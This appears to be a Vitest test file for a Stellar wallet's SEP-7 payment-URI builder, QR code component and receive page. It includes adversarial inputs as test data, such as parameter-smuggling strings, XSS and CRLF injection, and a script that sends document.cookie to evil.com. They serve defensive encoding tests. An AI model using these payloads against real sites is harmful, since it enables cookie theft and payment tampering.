// SPDX-License-Identifier: MIT

import { describe, it, expect, vi, beforeEach } from "vitest";
import { render, screen, fireEvent, waitFor, act } from "@testing-library/react";
import QRCode from "qrcode";
import { buildReceivePayload, buildSep7PayUri } from "@/lib/stellar-uri";
import { QrCode } from "@/components/ui/QrCode";
import ReceivePage from "@/app/receive/page";

const ADDR_A = "GAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
const ADDR_B = "GBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";
const ADDR_C = "GCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC";
const ADDR_D = "GDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD";

// ============================================================================
// 1. ADVERSARIAL URI BUILDER TESTS: Extreme & Malicious Inputs
// ============================================================================
describe("Adversarial SEP-7 URI Builder: buildSep7PayUri & buildReceivePayload", () => {
  const maliciousDestinations = [
    { name: "empty string", input: "" },
    { name: "whitespace only", input: "     " },
    { name: "query delimiter injection", input: "GABC?amount=999999&destination=ATTACKER" },
    { name: "hash fragment injection", input: "GABC#fake_fragment?amount=100" },
    { name: "ampersand parameter smuggling", input: "GABC&amount=999&memo=stolen&destination=EVIL" },
    { name: "script tag injection", input: "<script>alert('xss')</script>" },
    { name: "HTML tag with onerror handler", input: "\"><img src=x onerror=alert(1)>" },
    { name: "javascript pseudo-protocol", input: "javascript:alert(document.cookie)" },
    { name: "CRLF header injection", input: "GABC\r\nSet-Cookie: sessionId=hacked\r\n\r\n" },
    { name: "null byte embedding", input: "GABC\0secret_payload" },
    { name: "URL control characters", input: "GABC / : ; @ = + $ , ? % #" },
    { name: "unicode and emoji characters", input: "GABC_🚀_🌟_Stellar_💎" },
    { name: "RTL override characters", input: "\u202E\u0047\u0041\u0042\u0043_OVERRIDE" },
    { name: "lookalike Cyrillic homoglyphs", input: "G\u0410\u0412\u042112345" }, // Cyrillic А, В, С
    { name: "1,000 characters payload", input: "G" + "A".repeat(999) },
    { name: "10,000 characters payload", input: "G" + "X".repeat(9999) },
    { name: "50,000 characters payload", input: "G" + "Z".repeat(49999) },
  ];

  for (const { name, input } of maliciousDestinations) {
    it(`safely encodes destination with ${name} without parameter smuggling`, () => {
      const uri = buildReceivePayload(input);

      // Must always maintain the web+stellar:pay scheme
      expect(uri.startsWith("web+stellar:pay?destination=")).toBe(true);

      // Parse with standard WHATWG URL parser
      const parsed = new URL(uri);
      expect(parsed.protocol).toBe("web+stellar:");
      expect(parsed.pathname).toBe("pay");

      // Verify NO parameter smuggling occurred: destination must be the ONLY query parameter
      const allKeys = Array.from(parsed.searchParams.keys());
      expect(allKeys).toEqual(["destination"]);

      // Round-trip safety: parsing the parameter must yield the exact raw input
      expect(parsed.searchParams.get("destination")).toBe(input);
    });
  }

  describe("Malicious optional parameters in buildSep7PayUri", () => {
    it("safely isolates parameter smuggling attempts inside 'amount'", () => {
      const uri = buildSep7PayUri({
        destination: ADDR_A,
        amount: "100&memo=stolen&destination=HACKER#inject",
      });
      const parsed = new URL(uri);
      expect(parsed.searchParams.get("destination")).toBe(ADDR_A);
      expect(parsed.searchParams.get("amount")).toBe("100&memo=stolen&destination=HACKER#inject");
      expect(parsed.searchParams.get("memo")).toBeNull();
    });

    it("safely isolates script injection inside 'memo'", () => {
      const xss = "<script>fetch('http://evil.com/'+document.cookie)</script>";
      const uri = buildSep7PayUri({
        destination: ADDR_A,
        memo: xss,
        memoType: "MEMO_TEXT",
      });
      const parsed = new URL(uri);
      expect(parsed.searchParams.get("memo")).toBe(xss);
      expect(parsed.searchParams.get("memo_type")).toBe("MEMO_TEXT");
      expect(parsed.searchParams.get("destination")).toBe(ADDR_A);
    });

    it("safely handles parameter smuggling inside 'assetCode' and 'assetIssuer'", () => {
      const uri = buildSep7PayUri({
        destination: ADDR_A,
        assetCode: "USDC&amount=999999",
        assetIssuer: "GISSUER?extra=param#hash",
      });
      const parsed = new URL(uri);
      expect(parsed.searchParams.get("asset_code")).toBe("USDC&amount=999999");
      expect(parsed.searchParams.get("asset_issuer")).toBe("GISSUER?extra=param#hash");
      expect(parsed.searchParams.get("destination")).toBe(ADDR_A);
      expect(parsed.searchParams.get("amount")).toBeNull();
    });

    it("safely handles multi-kilobyte text inside 'msg'", () => {
      const largeMsg = "Pay immediately! ".repeat(500);
      const uri = buildSep7PayUri({
        destination: ADDR_A,
        msg: largeMsg,
      });
      const parsed = new URL(uri);
      expect(parsed.searchParams.get("msg")).toBe(largeMsg);
      expect(parsed.searchParams.get("destination")).toBe(ADDR_A);
    });
  });
});

// ============================================================================
// 2. EMPIRICAL QR CODE TESTS: Real Library Execution & Boundary Limits
// ============================================================================
describe("Empirical QrCode Component: Real QRCode Library", () => {
  it("renders a valid real QR data URL for normal SEP-7 payload", async () => {
    const payload = buildReceivePayload(ADDR_A);
    render(<QrCode value={payload} title="Test QR" />);

    // Initially shows generating status spinner
    // Then transitions to rendered image
    const img = await screen.findByRole("img", { name: "Test QR" });
    expect(img).toBeInTheDocument();
    expect(img.getAttribute("src")).toMatch(/^data:image\/png;base64,/);
  });

  it("handles oversized payload exceeding QR capacity gracefully with error fallback", async () => {
    // Payloads >= 2,500 bytes exceed QR code capacity at error correction level 'M'
    const hugePayload = "web+stellar:pay?destination=" + "X".repeat(3500);
    render(<QrCode value={hugePayload} title="Oversized QR" />);

    // Must gracefully catch the error and show the error container, NOT crash
    const errorFallback = await screen.findByRole("img", {
      name: /oversized qr — failed to generate/i,
    });
    expect(errorFallback).toBeInTheDocument();
    expect(errorFallback).toHaveTextContent("Couldn't generate QR code");
  });

  it("recovers gracefully from error state when value changes back to valid payload", async () => {
    const hugePayload = "web+stellar:pay?destination=" + "X".repeat(3500);
    const { rerender } = render(<QrCode value={hugePayload} title="Recovering QR" />);

    const errorFallback = await screen.findByRole("img", {
      name: /recovering qr — failed to generate/i,
    });
    expect(errorFallback).toBeInTheDocument();

    // Now update prop to valid payload
    const validPayload = buildReceivePayload(ADDR_A);
    rerender(<QrCode value={validPayload} title="Recovering QR" />);

    // Should transition from error fallback to valid image
    const img = await screen.findByRole("img", { name: "Recovering QR" });
    expect(img).toBeInTheDocument();
    expect(img.getAttribute("src")).toMatch(/^data:image\/png;base64,/);
    expect(screen.queryByText("Couldn't generate QR code")).toBeNull();
  });
});

// ============================================================================
// 3. ASYNCHRONOUS RACE CONDITION & CANCELLATION STRESS-TESTS
// ============================================================================
describe("QrCode Asynchronous Race Condition Handling", () => {
  it("ignores stale resolved promise when value changes rapidly (out-of-order resolution)", async () => {
    let resolveFirst: ((val: string) => void) | null = null;
    let resolveSecond: ((val: string) => void) | null = null;

    const toDataURLSpy = vi.spyOn(QRCode, "toDataURL").mockImplementation((...args: unknown[]) => {
      const text = args[0] as string;
      if (text === "FIRST_VALUE") {
        return new Promise<string>((resolve) => {
          resolveFirst = resolve;
        });
      }
      if (text === "SECOND_VALUE") {
        return new Promise<string>((resolve) => {
          resolveSecond = resolve;
        });
      }
      return Promise.resolve("data:image/png;base64,DEFAULT");
    });

    const { rerender } = render(<QrCode value="FIRST_VALUE" title="Race QR" />);
    expect(screen.getByRole("status", { name: /generating qr code/i })).toBeInTheDocument();

    // Rapidly change prop to SECOND_VALUE before FIRST_VALUE has resolved
    rerender(<QrCode value="SECOND_VALUE" title="Race QR" />);

    // Now resolve SECOND_VALUE first (fast response)
    await act(async () => {
      resolveSecond!("data:image/png;base64,SECOND_RESOLVED");
    });

    const img = await screen.findByRole("img", { name: "Race QR" });
    expect(img).toHaveAttribute("src", "data:image/png;base64,SECOND_RESOLVED");

    // Now resolve FIRST_VALUE late (slow response) — it MUST be cancelled and ignored!
    await act(async () => {
      resolveFirst!("data:image/png;base64,FIRST_STALE_RESOLVED");
    });

    // Verify it did NOT overwrite SECOND_VALUE
    expect(screen.getByRole("img", { name: "Race QR" })).toHaveAttribute(
      "src",
      "data:image/png;base64,SECOND_RESOLVED"
    );

    toDataURLSpy.mockRestore();
  });

  it("ignores stale rejection when previous slow request fails after new request succeeded", async () => {
    let rejectFirst: ((err: Error) => void) | null = null;
    let resolveSecond: ((val: string) => void) | null = null;

    const toDataURLSpy = vi.spyOn(QRCode, "toDataURL").mockImplementation((...args: unknown[]) => {
      const text = args[0] as string;
      if (text === "FAILING_FIRST") {
        return new Promise<string>((_, reject) => {
          rejectFirst = reject;
        });
      }
      if (text === "SUCCESS_SECOND") {
        return new Promise<string>((resolve) => {
          resolveSecond = resolve;
        });
      }
      return Promise.resolve("data:image/png;base64,DEFAULT");
    });

    const { rerender } = render(<QrCode value="FAILING_FIRST" title="Race QR 2" />);
    rerender(<QrCode value="SUCCESS_SECOND" title="Race QR 2" />);

    // SECOND_VALUE succeeds
    await act(async () => {
      resolveSecond!("data:image/png;base64,SUCCESS");
    });

    const img = await screen.findByRole("img", { name: "Race QR 2" });
    expect(img).toHaveAttribute("src", "data:image/png;base64,SUCCESS");

    // Late FAILING_FIRST rejects — must NOT trigger error state
    await act(async () => {
      rejectFirst!(new Error("Slow network or encode failure"));
    });

    // Must still show the successful image, not error fallback
    expect(screen.getByRole("img", { name: "Race QR 2" })).toHaveAttribute(
      "src",
      "data:image/png;base64,SUCCESS"
    );
    expect(screen.queryByText("Couldn't generate QR code")).toBeNull();

    toDataURLSpy.mockRestore();
  });

  it("safely handles unmount during in-flight generation without React warnings", async () => {
    let resolvePending: ((val: string) => void) | null = null;

    const toDataURLSpy = vi.spyOn(QRCode, "toDataURL").mockImplementation(() => {
      return new Promise<string>((resolve) => {
        resolvePending = resolve;
      });
    });

    const { unmount } = render(<QrCode value="PENDING_VAL" title="Unmount QR" />);
    expect(screen.getByRole("status")).toBeInTheDocument();

    // Unmount before resolution
    unmount();

    // Now resolve promise after unmount
    await act(async () => {
      resolvePending!("data:image/png;base64,AFTER_UNMOUNT");
    });

    // Should complete cleanly with no errors
    toDataURLSpy.mockRestore();
  });
});

// ============================================================================
// 4. DYNAMIC ACCOUNT SWITCHING IN RECEIVE PAGE
// ============================================================================
let mockWalletState: {
  connected: boolean;
  publicKey: string | null;
  network: string | null;
  balance: string | null;
  balanceLoading: boolean;
  activeWalletId: string | null;
};

const mockConnect = vi.fn();
const mockGetWalletConnector = vi.fn();

vi.mock("@/lib/wallets", async (importOriginal) => {
  const actual = await importOriginal<typeof import("@/lib/wallets")>();
  return {
    ...actual,
    getWalletConnector: () => mockGetWalletConnector(),
  };
});

vi.mock("@/hooks/useMultiWallet", () => ({
  useWallet: () => ({
    wallet: mockWalletState,
    connect: mockConnect,
    disconnect: vi.fn(),
    fetchBalance: vi.fn(),
    isConnecting: false,
    error: null,
    availableWallets: ["freighter", "albedo"],
  }),
}));

function setMockWallet(publicKey: string | null) {
  mockWalletState = {
    connected: Boolean(publicKey),
    publicKey,
    network: "TESTNET",
    balance: "100",
    balanceLoading: false,
    activeWalletId: publicKey ? "freighter" : null,
  };
}

describe("Adversarial Dynamic Account Switching in ReceivePage", () => {
  beforeEach(() => {
    setMockWallet(null);
    mockConnect.mockReset();
    mockGetWalletConnector.mockReset();
    mockGetWalletConnector.mockReturnValue({
      getAddress: () => Promise.resolve(null),
    });
    Object.assign(navigator, {
      clipboard: { writeText: vi.fn().mockResolvedValue(undefined) },
    });
  });

  it("dynamically updates all UI elements across 4 consecutive account switches", async () => {
    setMockWallet(ADDR_A);
    const { rerender } = render(<ReceivePage />);

    // 1. Initial Account A
    await screen.findByRole("img", { name: /receive qr code/i });
    expect(screen.getByText(ADDR_A)).toBeInTheDocument();
    expect(screen.getByText(`web+stellar:pay?destination=${ADDR_A}`)).toBeInTheDocument();
    expect(screen.getByRole("link", { name: /view on explorer/i })).toHaveAttribute(
      "href",
      `https://stellar.expert/explorer/testnet/account/${ADDR_A}`
    );

    // 2. Switch to Account B
    setMockWallet(ADDR_B);
    rerender(<ReceivePage />);
    await waitFor(() => {
      expect(screen.getByText(ADDR_B)).toBeInTheDocument();
    });
    expect(screen.queryByText(ADDR_A)).toBeNull();
    expect(screen.getByText(`web+stellar:pay?destination=${ADDR_B}`)).toBeInTheDocument();
    expect(screen.getByRole("link", { name: /view on explorer/i })).toHaveAttribute(
      "href",
      `https://stellar.expert/explorer/testnet/account/${ADDR_B}`
    );

    // 3. Switch to Account C
    setMockWallet(ADDR_C);
    rerender(<ReceivePage />);
    await waitFor(() => {
      expect(screen.getByText(ADDR_C)).toBeInTheDocument();
    });
    expect(screen.queryByText(ADDR_B)).toBeNull();
    expect(screen.getByText(`web+stellar:pay?destination=${ADDR_C}`)).toBeInTheDocument();
    expect(screen.getByRole("link", { name: /view on explorer/i })).toHaveAttribute(
      "href",
      `https://stellar.expert/explorer/testnet/account/${ADDR_C}`
    );

    // 4. Switch to Account D
    setMockWallet(ADDR_D);
    rerender(<ReceivePage />);
    await waitFor(() => {
      expect(screen.getByText(ADDR_D)).toBeInTheDocument();
    });
    expect(screen.queryByText(ADDR_C)).toBeNull();
    expect(screen.getByText(`web+stellar:pay?destination=${ADDR_D}`)).toBeInTheDocument();
    expect(screen.getByRole("link", { name: /view on explorer/i })).toHaveAttribute(
      "href",
      `https://stellar.expert/explorer/testnet/account/${ADDR_D}`
    );

    // Copy button copies Account D
    fireEvent.click(screen.getByRole("button", { name: /copy address/i }));
    await waitFor(() => {
      expect(navigator.clipboard.writeText).toHaveBeenCalledWith(ADDR_D);
    });

    // Payment URI copy button copies Account D payload
    fireEvent.click(screen.getByRole("button", { name: /copy payment uri/i }));
    await waitFor(() => {
      expect(navigator.clipboard.writeText).toHaveBeenCalledWith(
        `web+stellar:pay?destination=${ADDR_D}`
      );
    });
  });

  it("transitions seamlessly through Connected -> Disconnected -> Connected states", async () => {
    setMockWallet(ADDR_A);
    const { rerender } = render(<ReceivePage />);

    // Connected state
    await screen.findByRole("img", { name: /receive qr code/i });
    expect(screen.getByText(ADDR_A)).toBeInTheDocument();
    expect(screen.queryByText("Connect your wallet to receive")).toBeNull();

    // Disconnect
    setMockWallet(null);
    rerender(<ReceivePage />);

    expect(screen.getByText("Connect your wallet to receive")).toBeInTheDocument();
    expect(screen.getByRole("button", { name: /connect wallet/i })).toBeInTheDocument();
    expect(screen.queryByText(ADDR_A)).toBeNull();
    expect(screen.queryByRole("img", { name: /receive qr code/i })).toBeNull();

    // Reconnect with new account
    setMockWallet(ADDR_B);
    rerender(<ReceivePage />);

    await screen.findByRole("img", { name: /receive qr code/i });
    expect(screen.getByText(ADDR_B)).toBeInTheDocument();
    expect(screen.queryByText("Connect your wallet to receive")).toBeNull();
  });

  it("handles active connector account mismatch and reconnect flow", async () => {
    setMockWallet(ADDR_A);
    mockGetWalletConnector.mockReturnValue({
      getAddress: () => Promise.resolve(ADDR_B),
    });

    const { rerender } = render(<ReceivePage />);
    await screen.findByRole("img", { name: /receive qr code/i });

    // Warning alert is displayed
    const alert = await screen.findByRole("alert");
    expect(alert).toHaveTextContent("Wallet account changed");
    expect(alert).toHaveTextContent("GBBBBBBBB...BBBBBBBB");

    // Click reconnect
    const reconnectBtn = screen.getByRole("button", { name: /reconnect/i });
    fireEvent.click(reconnectBtn);
    expect(mockConnect).toHaveBeenCalledWith("freighter");

    // Simulate session update
    setMockWallet(ADDR_B);
    mockGetWalletConnector.mockReturnValue({
      getAddress: () => Promise.resolve(ADDR_B),
    });
    rerender(<ReceivePage />);
    await screen.findByRole("img", { name: /receive qr code/i });

    // Alert clears
    await waitFor(() => {
      expect(screen.queryByRole("alert")).toBeNull();
    });
    expect(screen.getByText(ADDR_B)).toBeInTheDocument();
  });

  it("handles connector getAddress promise rejection gracefully without crashing", async () => {
    setMockWallet(ADDR_A);
    mockGetWalletConnector.mockReturnValue({
      getAddress: () => Promise.reject(new Error("Extension communication failed")),
    });

    render(<ReceivePage />);
    await screen.findByRole("img", { name: /receive qr code/i });

    // Page still renders stably without alert or crash
    expect(screen.getByText(ADDR_A)).toBeInTheDocument();
    expect(screen.queryByRole("alert")).toBeNull();
  });

  it("cancels in-flight live address check when account changes before check resolves", async () => {
    setMockWallet(ADDR_A);
    let resolveSlowCheck: ((addr: string) => void) | null = null;
    mockGetWalletConnector.mockReturnValue({
      getAddress: () =>
        new Promise<string>((resolve) => {
          resolveSlowCheck = resolve;
        }),
    });

    const { rerender } = render(<ReceivePage />);
    await screen.findByRole("img", { name: /receive qr code/i });

    // While check for ADDR_A is still pending, wallet account changes to ADDR_B
    setMockWallet(ADDR_B);
    mockGetWalletConnector.mockReturnValue({
      getAddress: () => Promise.resolve(ADDR_B),
    });
    rerender(<ReceivePage />);
    await screen.findByRole("img", { name: /receive qr code/i });

    // Now resolve the old check with ADDR_C (stale mismatch check)
    if (resolveSlowCheck) {
      await act(async () => {
        resolveSlowCheck!(ADDR_C);
      });
    }

    // Must NOT show mismatch for ADDR_C because the effect was cancelled
    expect(screen.queryByRole("alert")).toBeNull();
    expect(screen.getByText(ADDR_B)).toBeInTheDocument();
  });

  it("renders 500-character address stably without overflowing or throwing", async () => {
    const longAddr = "G" + "LONGADDRESS".repeat(45);
    setMockWallet(longAddr);
    mockGetWalletConnector.mockReturnValue({
      getAddress: () => Promise.resolve(longAddr),
    });

    render(<ReceivePage />);
    await screen.findByRole("img", { name: /receive qr code/i });

    expect(screen.getByText(longAddr)).toBeInTheDocument();
    expect(screen.getByText(`web+stellar:pay?destination=${longAddr}`)).toBeInTheDocument();
  });
});

describe("QrCode Rapid Hammering Stress-Test", () => {
  it("survives 25 rapid prop updates without errors or stale state", async () => {
    const { rerender } = render(<QrCode value="INIT" title="Hammer QR" />);

    for (let i = 0; i < 25; i++) {
      rerender(<QrCode value={`VALUE_${i}`} title="Hammer QR" />);
    }

    // Final target
    rerender(<QrCode value="FINAL_SETTLED_VALUE" title="Hammer QR" />);

    const img = await screen.findByRole("img", { name: "Hammer QR" });
    expect(img).toBeInTheDocument();
    expect(img.getAttribute("src")).toMatch(/^data:image\/png;base64,/);
  });
});

